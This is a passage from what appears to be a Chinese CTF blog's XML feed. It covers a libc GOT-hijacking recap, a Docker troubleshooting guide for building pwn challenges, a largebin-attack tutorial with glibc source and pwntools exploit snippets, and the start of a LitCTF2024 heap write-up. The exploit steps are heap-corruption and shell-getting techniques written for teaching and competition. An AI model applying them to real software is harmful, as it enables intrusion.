alt="gadget出处"></p><p>于是就有了PoC那样的劫持步骤。</p><p>总结一下：</p><ol><li>泄露libc地址</li><li>劫持<code>strlen</code>的got表，写入<code>explicit_bzero</code>的gadget</li><li>劫持<code>memset</code>的got表，写入one gadget</li><li>执行puts函数getshell</li></ol><p>实际题目中，我们要劫持的函数不一定是puts函数，可以是<code>stack_chk_fail</code>或者其他的，只要调用了got表函数，能满足ogg条件，都能劫持。甚至为了满足ogg条件，可以凑一条调用链出来。</p>]]></content>
      
      
      <categories>
          
          <category> hijack_libc_got </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> libc_got </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>出PWN题可能会遇到的docker相关问题及其解决办法</title>
      <link href="/2024/first-docker/"/>
      <url>/2024/first-docker/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>最近给战队出了一道pwn题，第一次体验完整的出题流程，涉及到docker的使用。因为是第一次使用docker来封装题目环境，所以遇到了很多问题。网上有一些关于出pwn题的使用方法，但是有些问题没有提到，所以这里记录一下我遇到的问题，还有解决方法。docker的安装网上教程很多这里不多赘述。</p><p>顺带一提，我的操作环境是wsl2的Ubuntu 22.04.3 LTS，若有因环境不同而引起的操作不同，具体请查询其他资料。</p><h3 id="0x01-一些前置知识or命令"><a href="#0x01-一些前置知识or命令" class="headerlink" title="0x01 一些前置知识or命令"></a>0x01 一些前置知识or命令</h3><p>一般来说，docker的命令之前要加一个sudo来提升权限，不然有些命令可能执行不了。</p><p><code>sudo docker images</code>：查看系统中存有的所有镜像及相关信息。</p><p><img src="https://c-lby.top/images/first_docker/docker_images.png" alt="docker_images"></p><p><code>sudo docker ps -a</code>：查看系统中所有容器的状态。</p><p><img src="https://c-lby.top/images/first_docker/docker_ps.png" alt="docker_ps"></p><p><code>sudo docker ps</code>：查看当前运行中的容器。</p><p>镜像和容器的关系就好比C++中的类和其实例对象的关系，一个镜像可以同时有多个容器运行。</p><p><code>sudo docker run -d -p &quot;0.0.0.0:10001:9999&quot; -h &quot;pwn_h&quot; --name=&quot;pwn1&quot; pwn</code>：从名为pwn的镜像中运行一个名为pwn1的容器，并将这个容器映射到10001端口运行。那么我们就可以通过0.0.0.0:10001访问到这个容器里的服务或者运行的程序。9999是docker的内部端口，-h后面接着的是hostname。</p><p><code>sudo docker stop xxx</code>：xxx是某个容器container ID的前三位，或者这个容器的名称也行，这个命令用于停止某个容器的运行。只是停止不是删除。</p><p><code>sudo docker rm xxx</code>：xxx是某个容器container ID的前三位，或者这个容器的名称也行，这个命令用于删除一个容器。</p><p><code>sudo docker rmi xxx</code>：xxx是某个镜像image ID的前三位，或者这个镜像的名称也行，这个命令用于删除一个镜像。注意镜像ID和容器ID是不一样的。</p><p><code>sudo docker build . -t pwn</code>：在当前目录下通过dockerfile来build一个名为pwn的镜像。别漏了中间那个点。</p><p><code>sudo docker cp pwn:/home/ctf/flag ./flaglocal</code>：从名为pwn的容器中复制&#x2F;home&#x2F;ctf&#x2F;flag到自己电脑当前目录，并命名为flaglocal。把两个路径反过来就是从电脑复制文件到容器中。</p><p><code>sudo docker exec -it xxx /bin/bash</code>：xxx是某个容器container ID的前三位，或者这个容器的完整ID也行，这个命令表示以root身份进入到容器中操作。在容器内输入exit或者按ctrl+D即可退出容器回到自己的系统。</p><p><code>sudo docker info</code>：查看docker概况，包括镜像源。</p><p><code>sudo docker save aaa &gt; aaa.tar</code>：保存名为aaa的镜像并导出保存为tar。</p><p><code>sudo docker load --input aaa.tar</code>：从aaa.tar导入镜像</p><h3 id="0x02-dockerfile"><a href="#0x02-dockerfile" class="headerlink" title="0x02 dockerfile"></a>0x02 dockerfile</h3><p>一般CTF赛制中pwn出题对dockerfile都是有特定要求的，awd赛制又有另一套方案。可以用<a href="https://github.com/Eadom/ctf_xinetd">ctf-xinetd</a>的模板，关于它的使用可以看这个师傅的<a href="https://cloud.tencent.com/developer/article/2183060">文章</a>。我是用战队师傅给的dockerfile模板来创建镜像的。</p><p>一把来说，CTF的pwn题环境中，为了防止选手搅屎，会限制bin中只有<code>ls</code>、<code>cat</code>、<code>sh</code>三个命令可用，并且限制workdir，这样选手一般就没法搞搞阵了。（如果这还能容器逃逸啥的，可以考虑把sh换成只能显示flag功能）</p><h3 id="0x03-国内部分镜像站被关停无法使用"><a href="#0x03-国内部分镜像站被关停无法使用" class="headerlink" title="0x03 国内部分镜像站被关停无法使用"></a>0x03 国内部分镜像站被关停无法使用</h3><p><code>docker.m.daocloud.io</code>国内依然能用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo vim /etc/docker/daemon.json</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;registry-mirrors&quot;:[&quot;https://docker.m.daocloud.io&quot;]</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">systemctl daemon-reload</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">systemctl restart docker.service</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker info</span></span><br></pre></td></tr></table></figure><p>然后就能看到镜像源已经换了。</p><h3 id="0x04-本地运行与docker中运行结果不一致"><a href="#0x04-本地运行与docker中运行结果不一致" class="headerlink" title="0x04 本地运行与docker中运行结果不一致"></a>0x04 本地运行与docker中运行结果不一致</h3><p>可能是因为docker拉取到的镜像与本地的环境不一样，尤其是libc版本。下面是两个可能的解决方案：</p><ol><li><p>如果题目和内核无关，只和libc版本有关，可以把需要版本的libc和ld放到workdir中，并用patchelf修改程序的libc目录。</p></li><li><p>根据本地环境中的libc版本，还有linux发行版本，可以上网搜到这个版本的发行，然后我们来到docker网站找到与这个日期相近的tag来作为映像。</p><p>举个栗子。现在我的本地环境是ubuntu22.04.3LTS。</p><p>如果我在dockerfile中写<code>FROM ubuntu:22.04</code>，那么他会默认拉取ubuntu22.04的latest版本。我们打开<a href="https://hub.docker.com/_/ubuntu/tags?page=1&page_size=&name=jammy&ordering=">dockerhub</a>看一眼（需要科学上网）。<img src="https://c-lby.top/images/first_docker/dockerhub%E6%9C%80%E6%96%B0.png" alt="dockerhub最新"></p><p>换句话说，这个时候<code>FROM ubuntu:22.04</code>和<code>FROM ubuntu:jammy-20240530</code>是一样的。但是最新的是ubuntu22.04.4，显然不符合本地环境。</p><p>可以查到ubuntu22.04.3LTS的发行日期是2023.8.10，那我们就去找tag接近这个日期的映像。<img src="https://c-lby.top/images/first_docker/dockerhub2023tag.png" alt="dockerhub2023tag"></p><p>可以逐个去试一试看符不符合运行期望。也可以在dockerfile中，往镜像假如ldd的指令，这样就可以进入到容器中查看libc版本。</p><p>这里还会出现一个问题，那就是本地的ubuntu是会不断更新的。比如22.04.3一开始的libc版本是2.35_3.1，但是随着安全升级，会变成2.35_3.8，那就可能不能根据日期来选择tag了，因为旧日期的tag版本，libc版本也是旧的。还有一个问题比较恶心的就是，wsl因为魔改的原因，就算linux版本和libc版本一致了，也会因为内核的原因导致奇奇怪怪的问题。所以尽量避免用wsl出题（避坑）。</p><p>出好了题目保存docker之后，最好放到其他机器再测试一下，有时候很鬼畜的不同机器会有不同运行结果的（虽然几率比较小）。</p></li></ol><h3 id="0x05-如何调试docker内运行的程序"><a href="#0x05-如何调试docker内运行的程序" class="headerlink" title="0x05 如何调试docker内运行的程序"></a>0x05 如何调试docker内运行的程序</h3><p>xf1les师傅告诉我，本地运行docker的话，gdb是可以attach到docker中运行的程序的。有两种调试方法。</p><p>第一种是进入到容器当中运行程序，然后在另一个终端再进一次容器，通过<code>pmap -d pid</code>来查看程序内存布局。这里的pid是容器内的pid。可以给镜像装gdb，然后就可以在容器里调试了。这个方法有个缺点，那就是在root后的容器里运行程序，他的运行环境不一定是docker环境，可能取决于宿主机。</p><p>第二种是在docker外调试。假如我现在通过nc打开了容器里的某个服务，现在我打开另一个终端，在终端里输入<code>ps -auxw</code>，可以看到刚刚开启的服务的名字，用对应的pid（这个pid是对应本机linux的）来进行attach：<code>gdb attach pid</code>即可调试容器中的程序。这样调试的话，可以用自己电脑上的pwndbg，比较方便，而且更加准确。但是这样attach是无法自动载入符号表的，需要在pwndbg中手动设置程序和libc和ld。</p><p>如果想从脚本调试，可以在脚本中穿插一个pause，然后手动查找pid并attach。</p><h3 id="0x06-后记"><a href="#0x06-后记" class="headerlink" title="0x06 后记"></a>0x06 后记</h3><p>pwn出题还是相当不容易的。如果后续还遇到了其他问题，我会继续更新。一定不要用wsl出题！！！</p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『Heap Exploitation』largebin_attack</title>
      <link href="/2024/largebin-attack/"/>
      <url>/2024/largebin-attack/</url>
      
        <content type="html"><![CDATA[<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>首先每个Large Bin中存在63个bin链表，在binmap中的index是64-126。每个bin中存的是一定范围内大小的chunk，而不是像tcachebin那样的一个bin一个大小。举个栗子，index64的bin中存的是0x400到0x430的chunk。每个bin能存取的范围一般是0x30。</p><p>Large Bin既不是FIFO也不是LIFO，它的排序是根据chunk大小来进行的，并且结构更加复杂。large chunk被释放的时候不仅会被写入fd和bk，还有fd_nextsize和bk_nextsize两个指针来维护bin的结构。fd和bk用来链接bin中相同大小的chunk，而nextsize则用来链接bin中不同大小的chunk。更具体地说，<code>fd</code>指向比自己晚释放的相同大小的chunk，<code>bk</code>则指向比自己晚释放的相同大小的chunk，<code>fd_nextsize</code>用来指向比自己大的chunk，<code>bk_nextsize</code>则指向比自己小的chunk。在相同大小的chunkbin中只有首堆块会有nextsize的指针。bin中首尾chunk的nextsize会指向另一端，首堆块的fd会指向对应index的bin头地址，尾堆块的bk会指向对应index的bin头地址。</p><p>这里引用Sr0cky师傅的一张图，可以更直观地看清楚largebin的结构：</p><p><img src="https://c-lby.top/images/largebin_attack/largebin%E9%93%BE%E8%A1%A8%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="largebin链表示意图"></p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>我们只关注释放chunk时候的代码，因为主要检查在这个地方，主要利用的地方也在这里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">       ...</span><br><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">          &#123;</span><br><span class="line">            victim_index = smallbin_index (size);</span><br><span class="line">            bck = bin_at (av, victim_index);</span><br><span class="line">            fwd = bck-&gt;fd;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            victim_index = largebin_index (size);</span><br><span class="line">            bck = bin_at (av, victim_index);</span><br><span class="line">            fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">            <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                size |= PREV_INUSE;</span><br><span class="line">                <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">      &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                  &#123;</span><br><span class="line">                    fwd = bck;</span><br><span class="line">                    bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                  &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    assert (chunk_main_arena (fwd));</span><br><span class="line">                    <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                      &#123;</span><br><span class="line">                        fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">  assert (chunk_main_arena (fwd));</span><br><span class="line">                      &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">  == (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                      <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                      fwd = fwd-&gt;fd;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                      &#123;</span><br><span class="line">                        victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                        <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                          malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">                        fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                      &#125;</span><br><span class="line">                    bck = fwd-&gt;bk;</span><br><span class="line">                    <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">                      malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        mark_bin (av, victim_index);</span><br><span class="line">        victim-&gt;bk = bck;</span><br><span class="line">        victim-&gt;fd = fwd;</span><br><span class="line">        fwd-&gt;bk = victim;</span><br><span class="line">        bck-&gt;fd = victim;</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure><p>如果chunk在smallbin范围，则插入到smallbin中，如果不是，则进行下一步，进行插入largebin的处理。此时<code>bck</code>是对应index的bin头。<code>victim</code>指的是当前正在被释放的chunk。</p><p>第17行的if与第60行的else匹配，检查如果该bin为空，则直接将victim的nextsize都指向自身，fd和bk指向bin头。如果不为空则进入下一个检查。</p><p>第42行检查victim的size是否小于当前bin中最小的那个chunk，则直接将victim插入到bin的头部。在这里有个很重要的语句（第31行），也是我们需要利用到的语句。我们来逐行解释一下这个语句块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p>为避免歧义，首先说明，在这些语句执行完之前我们不认为victim已经进入了bin。首先将<code>fwd</code>赋值为bin头，然后<code>bck</code>赋值为当前bin中最小那个chunk。紧接着将victim的<code>fd_nextsize</code>赋值为bin中的尾堆块，然后将<code>bk_nextsize</code>赋值为当前bin中最小的chunk。然后重点来了！当前bin中的尾堆块的<code>bk_nextsize</code>指向victim，当前最小chunk的<code>fd_nextsize</code>也指向victim。现在我们才视为victim完全进入了largebin当中。</p><p>可以注意到在这个过程，有两个指针被赋值为victim的地址。如果我们在释放victim之前有机会修改当前bin中最小chunk的<code>bk_nextsize</code>为<code>target</code>，那也就意味着我们可以往<code>target+0x20的位置</code>写入victim的地址。这个结果就是我们所说的largebin attack的结果。</p><p>2.30前后的区别在于第50行和第57行的两个检查，多了两个检查所以就不能使用传统的largebin attack方法了。</p><h3 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h3><p>其实可以看how2heap的PoC学习，这里我直接结合<a href="https://c-lby.top/2024/06/04/2024-litctf-wp/#0x05-2-35">2024litctf的2.35</a>那题来讲。</p><p>根据源码分析，我们如果想要执行到那条重要语句，我们需要先后释放掉一大一小两个largechunk。在每个largechunk下面要多一个chunk用来防止largechunk被释放后被向下合并，大小任意。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>) </span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x30</span>)</span><br></pre></td></tr></table></figure><p>接着我们释放<code>chunk2</code>。这时候它先进入到<code>unsortedbin</code>中，我们申请一个比<code>chunk2</code>还要大的chunk，因为<code>chunk2</code>不够被分配，所以它会被整理到largebin当中。这时候他就同时拥有了libc地址和heap地址。</p><p>因为有UAF，所以可以直接从<code>chunk2</code>泄露出libc地址和heap。因为show函数使用的是printf语句，所以要注意\x00截断的问题：保护chunk如果是0x20，那么<code>chunk2</code>的地址最后一个字节刚好是\x00，那就没法泄露了；fd和bk是指向main_arena+0x490处的libc地址，同样有\x00字节，所以在泄露堆地址的时候要先随便填点什么00之外的东西在fd和bk位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x530</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">large = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))  <span class="comment"># 其实是main_arena+0x490</span></span><br><span class="line">libcbase = large - <span class="number">0x670</span> - libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]  <span class="comment"># 也可以直接看vmmap动调出偏移</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase: &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">r.recv(<span class="number">0x10</span>)</span><br><span class="line">heap = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;heap: &#x27;</span> + <span class="built_in">hex</span>(heap))</span><br></pre></td></tr></table></figure><p>然后我们释放<code>chunk0</code>进入到<code>unsrotedbin</code>中，然后修改<code>chunk2</code>的<code>bk_nextsize</code>为<code>_IO_list_all-0x20</code>(因为后续会打house of apple2)。接着我们申请一个大于chunk2的chunk，把chunk0放进largebin中。注意改chunk2的时候除了<code>bk_nextsize</code>其他东西尽量保持原状，因为会检查其他三项的合法性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, p64(large) + p64(large) + p64(heap) + p64(_IO_list_all - <span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x550</span>)</span><br></pre></td></tr></table></figure><p>根据源码分析，我们可以知道<code>_IO_list_all</code>就会被写入chunk0的地址。至此，largebin attack就算完成了。</p><p>我们断点检查一下：</p><p><img src="https://c-lby.top/images/largebin_attack/2.35%E6%94%BB%E5%87%BB%E7%BB%93%E6%9E%9C.png" alt="2.35攻击结果"></p><p>可以看到_IO_list_all已经被写入chunk0的地址了。后面就是house of apple2了，这里不展开赘述。</p>]]></content>
      
      
      <categories>
          
          <category> Heap Exploitation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『LitCTF2024』 PWN WP</title>
      <link href="/2024/2024-litctf-wp/"/>
      <url>/2024/2024-litctf-wp/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>虽然说是新生赛，但是五道堆题估计真新生都被吓傻了。实际上题目限制非常宽松，也正好可以拿来总结各个常见版本glibc的基本特点。因为题目除了2.39之外都一样所以就先分析题目，再来看不同版本下的做法。</p><h3 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a>0x01 题目分析</h3><h5 id="create函数"><a href="#create函数" class="headerlink" title="create函数"></a>create函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0xF</span> || ptr[v2] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error !&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size? &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">    v1 = v2;</span><br><span class="line">    ptr[v1] = <span class="built_in">malloc</span>((<span class="type">int</span>)v3);</span><br><span class="line">    <span class="keyword">if</span> ( !ptr[v2] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;malloc error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = v3;</span><br><span class="line">    ptr_size[v2] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目限制了最多只能申请16个chunk，但是对size没有限制。</p><h5 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v0);</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0xF</span> &amp;&amp; ptr[v0] )</span><br><span class="line">    <span class="built_in">free</span>((<span class="type">void</span> *)ptr[v0]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no such chunk!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>妥妥的UAF。但是指针没被清空也意味着最多只能16个chunk了。</p><h5 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0xF</span> &amp;&amp; ptr[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;content : %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)ptr[v1]);</span><br><span class="line">  <span 